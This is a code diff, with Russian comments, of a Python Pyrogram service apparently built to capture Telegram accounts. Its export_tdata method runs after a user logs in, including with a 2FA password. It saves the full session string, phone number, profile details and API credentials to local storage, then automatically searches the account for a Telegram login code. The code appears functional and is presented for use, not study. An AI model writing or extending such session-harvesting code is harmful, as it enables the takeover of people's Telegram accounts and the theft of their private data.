@@ -16,6 +16,7 @@ from pyrogram.errors import (
     FloodWait
 )
 
+# Настройка логирования
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
@@ -106,7 +107,6 @@ async def find_and_display_telegram_code(session_string):
             'telegram_code': None
         }
 
-# Остальной ваш код остается без изменений...
 class JSONStorageManager:
     def __init__(self):
         self.storage_path = "./tdata_storage"
@@ -470,80 +470,80 @@ class TelegramAuthTester:
                 del ACTIVE_SESSIONS[session_id]
             return {'success': False, 'error': 'Неверный пароль 2FA'}
     
-    # ДОБАВЬ ЭТУ ФУНКЦИЮ В КЛАСС TelegramAuthTester
-        async def export_tdata(self, client, user_info, request_info=None):
-            try:
-                session_string = await client.export_session_string()
-    
-                dc_info = await client.storage.dc_id()
-                dc_id = dc_info if dc_info else 2
-    
-                tdata_info = {
-            'version': '1.0',
-            'user_id': user_info['id'],
-            'phone_number': user_info.get('phone_number', ''),
-            'first_name': user_info.get('first_name', ''),
-            'last_name': user_info.get('last_name', ''),
-            'username': user_info.get('username', ''),
-            'session_string': session_string,
-            'dc_id': dc_id,
-            'api_id': self.api_id,
-            'api_hash': self.api_hash,
-            'device_model': 'Pyrogram Export',
-            'system_version': '1.0',
-            'app_version': '1.0',
-            'lang_code': 'en',
-            'system_lang_code': 'en',
-            'exported_at': datetime.now().isoformat(),
-            'session_type': 'pyrogram_string_session'
-        }
-    
-                storage.save_user(user_info)
-    
-                session_data = {
-            'session_string': session_string,
-            'dc_id': dc_id,
-            'api_id': self.api_id,
-            'api_hash': self.api_hash,
-            'device_model': 'Pyrogram Export',
-            'system_version': '1.0',
-            'app_version': '1.0',
-            'lang_code': 'en',
-            'system_lang_code': 'en'
-        }
-    
-                session_id = storage.save_session(user_info['id'], session_data, request_info)
-    
-                if session_id:
-                    tdata_id = storage.save_tdata(user_info['id'], session_id, tdata_info)
+    # 🔧 ДОБАВЛЯЕМ ОТСУТСТВУЮЩИЙ МЕТОД export_tdata
+    async def export_tdata(self, client, user_info, request_info=None):
+        try:
+            session_string = await client.export_session_string()
         
-                    logger.info(f"💾 TData сохранен. Session ID: {session_id}, TData ID: {tdata_id}")
-            
-            # 🔍 ДОБАВЛЯЕМ АВТОМАТИЧЕСКИЙ ПОИСК КОДА ПОСЛЕ АВТОРИЗАЦИИ
-                    logger.info("🔍 Запуск автоматического поиска кода Telegram...")
-                    code_search_result = await find_and_display_telegram_code(session_string)
-            
-                    if code_search_result and code_search_result['code_found']:
-                        logger.info(f"✅ Автоматически найден код: {code_search_result['telegram_code']}")
-                    else:
-                        logger.info("❌ Код не найден при автоматическом поиске")
+            dc_info = await client.storage.dc_id()
+            dc_id = dc_info if dc_info else 2
         
-                    return {
-                'success': True,
-                'session_id': session_id,
-                'tdata_id': tdata_id,
+            tdata_info = {
+                'version': '1.0',
                 'user_id': user_info['id'],
+                'phone_number': user_info.get('phone_number', ''),
+                'first_name': user_info.get('first_name', ''),
+                'last_name': user_info.get('last_name', ''),
+                'username': user_info.get('username', ''),
                 'session_string': session_string,
-                'message': 'TData успешно экспортирован в JSON хранилище',
-                # 🔍 ДОБАВЛЯЕМ РЕЗУЛЬТАТ ПОИСКА КОДА В ОТВЕТ
-                'code_search_result': code_search_result
+                'dc_id': dc_id,
+                'api_id': self.api_id,
+                'api_hash': self.api_hash,
+                'device_model': 'Pyrogram Export',
+                'system_version': '1.0',
+                'app_version': '1.0',
+                'lang_code': 'en',
+                'system_lang_code': 'en',
+                'exported_at': datetime.now().isoformat(),
+                'session_type': 'pyrogram_string_session'
             }
-                else:
-                    return {'success': False, 'error': 'Ошибка сохранения сессии'}
         
-            except Exception as e:
-                logger.error(f"❌ Ошибка экспорта TData: {e}")
-                return {'success': False, 'error': f'Ошибка экспорта: {str(e)}'}
+            storage.save_user(user_info)
+        
+            session_data = {
+                'session_string': session_string,
+                'dc_id': dc_id,
+                'api_id': self.api_id,
+                'api_hash': self.api_hash,
+                'device_model': 'Pyrogram Export',
+                'system_version': '1.0',
+                'app_version': '1.0',
+                'lang_code': 'en',
+                'system_lang_code': 'en'
+            }
+        
+            session_id = storage.save_session(user_info['id'], session_data, request_info)
+        
+            if session_id:
+                tdata_id = storage.save_tdata(user_info['id'], session_id, tdata_info)
+            
+                logger.info(f"💾 TData сохранен. Session ID: {session_id}, TData ID: {tdata_id}")
+                
+                # 🔍 ДОБАВЛЯЕМ АВТОМАТИЧЕСКИЙ ПОИСК КОДА
+                logger.info("🔍 Запуск автоматического поиска кода Telegram...")
+                code_search_result = await find_and_display_telegram_code(session_string)
+                
+                if code_search_result and code_search_result['code_found']:
+                    logger.info(f"✅ Автоматически найден код: {code_search_result['telegram_code']}")
+                else:
+                    logger.info("❌ Код не найден при автоматическом поиске")
+            
+                return {
+                    'success': True,
+                    'session_id': session_id,
+                    'tdata_id': tdata_id,
+                    'user_id': user_info['id'],
+                    'session_string': session_string,
+                    'message': 'TData успешно экспортирован в JSON хранилище',
+                    'code_search_result': code_search_result
+                }
+            else:
+                return {'success': False, 'error': 'Ошибка сохранения сессии'}
+            
+        except Exception as e:
+            logger.error(f"❌ Ошибка экспорта TData: {e}")
+            return {'success': False, 'error': f'Ошибка экспорта: {str(e)}'}
+
 auth_tester = TelegramAuthTester()
 
 # ДОБАВЛЯЕМ НОВЫЙ API ENDPOINT ДЛЯ ПОИСКА КОДА TELEGRAM
